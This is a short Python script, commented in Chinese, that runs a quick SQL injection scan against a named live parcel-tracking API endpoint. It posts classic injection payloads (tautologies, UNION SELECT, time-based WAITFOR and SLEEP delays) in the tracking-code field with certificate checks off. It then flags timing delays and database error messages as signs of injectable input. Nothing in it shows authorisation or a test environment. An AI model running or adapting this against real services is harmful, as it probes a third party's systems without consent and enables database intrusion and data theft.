#!/usr/bin/env python3
import requests
import urllib3
import time

urllib3.disable_warnings()

url = "https://api-dingdong.ems.com.vn/api/TrackTrace/Lading"

# SQL 注入测试载荷
payloads = [
    "TEST",
    "TEST' OR '1'='1",
    "TEST' OR 1=1--",
    "TEST' AND '1'='2",
    "TEST' UNION SELECT NULL--",
    "TEST'; WAITFOR DELAY '00:00:05'--",
    "TEST' AND SLEEP(5)--",
]

print("快速 SQL 注入测试\n")

for payload in payloads:
    data = {"LadingCode": payload, "Signature": "XXX"}
    
    try:
        start = time.time()
        resp = requests.post(url, json=data, verify=False, timeout=10)
        elapsed = time.time() - start
        
        print(f"\n载荷: {payload}")
        print(f"状态: {resp.status_code}")
        print(f"时间: {elapsed:.2f}s")
        print(f"响应: {resp.text[:200]}")
        
        # 检测时间延迟（盲注）
        if elapsed > 4:
            print("⚠️ 可能存在时间盲注！")
        
        # 检测错误消息
        if any(err in resp.text.lower() for err in ['sql', 'oracle', 'syntax', 'error', 'exception']):
            print("⚠️ 可能存在 SQL 错误泄露！")
            
    except Exception as e:
        print(f"载荷: {payload} - 错误: {str(e)}")
    
    time.sleep(0.5)
